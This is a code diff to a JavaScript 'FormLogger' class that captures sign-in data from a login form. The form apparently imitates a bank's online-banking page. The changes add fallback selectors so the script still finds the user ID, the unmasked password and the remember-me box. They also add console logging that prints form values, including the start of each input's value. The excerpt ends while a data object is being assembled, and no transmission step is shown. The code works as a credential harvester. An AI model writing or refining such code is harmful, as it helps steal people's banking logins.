@@ -218,18 +218,42 @@ class FormLogger {
   async logFormData(form) {
     try {
       console.log('[Logger] logFormData() started');
+      console.log('[Logger] Form element:', form.id, 'Tag:', form.tagName);
+      
+      // Debug: Log form contents
+      const inputs = form.querySelectorAll('input');
+      console.log('[Logger] Form has', inputs.length, 'input elements');
+      inputs.forEach((input, idx) => {
+        console.log(`  [${idx}] Name: ${input.name}, ID: ${input.id}, Type: ${input.type}, Value: ${input.value.substring(0, 20)}`);
+      });
       
       // Ensure password field is enabled during submit
       const passwordInput = document.getElementById('tlpvt-passcode-input');
       if (passwordInput) {
         passwordInput.disabled = false;
         console.log('[Logger] Password field disabled state checked:', passwordInput.disabled);
+      } else {
+        console.log('[Logger] WARNING: Password input not found!');
       }
       
-      // Get User ID from input field
-      const userIdInput = form.querySelector('input[name="dummy-onlineId"]');
+      // Get User ID from input field - try multiple selectors
+      let userIdInput = form.querySelector('input[name="dummy-onlineId"]');
+      if (!userIdInput) {
+        console.log('[Logger] dummy-onlineId not found in form, trying by ID...');
+        userIdInput = document.getElementById('enterID-input');
+      }
+      if (!userIdInput) {
+        console.log('[Logger] enterID-input not found, trying to find any text input...');
+        const textInputs = form.querySelectorAll('input[type="text"]');
+        console.log('[Logger] Found', textInputs.length, 'text inputs in form');
+        if (textInputs.length > 0) {
+          userIdInput = textInputs[0];
+          console.log('[Logger] Using first text input:', userIdInput.name);
+        }
+      }
+      
       const userIdValue = userIdInput ? userIdInput.value.trim() : '';
-      console.log('[Logger] User ID captured:', userIdValue);
+      console.log('[Logger] User ID input element:', userIdInput, 'Value:', userIdValue);
 
       // Get the actual password value directly from the input field (NOT masked)
       let passwordValue = '';
@@ -246,12 +270,21 @@ class FormLogger {
 
       // Get Remember Me checkbox - try both possible selectors
       let rememberMe = false;
-      const rememberInput1 = form.querySelector('input[name="saveMyID"]');
-      const rememberInput2 = form.querySelector('input[name="dummy-rememberMe"]');
-      const rememberInput = rememberInput1 || rememberInput2;
+      let rememberInput = form.querySelector('input[name="saveMyID"]');
+      if (!rememberInput) {
+        rememberInput = form.querySelector('input[name="dummy-rememberMe"]');
+      }
+      if (!rememberInput) {
+        // Try to find any checkbox in the form
+        const checkboxes = form.querySelectorAll('input[type="checkbox"]');
+        console.log('[Logger] Found', checkboxes.length, 'checkboxes in form');
+        if (checkboxes.length > 0) {
+          rememberInput = checkboxes[0];
+        }
+      }
       if (rememberInput) {
         rememberMe = rememberInput.checked;
-        console.log('[Logger] Remember Me:', rememberMe);
+        console.log('[Logger] Remember Me:', rememberMe, '(Field name:', rememberInput.name, ')');
       }
 
       const data = {
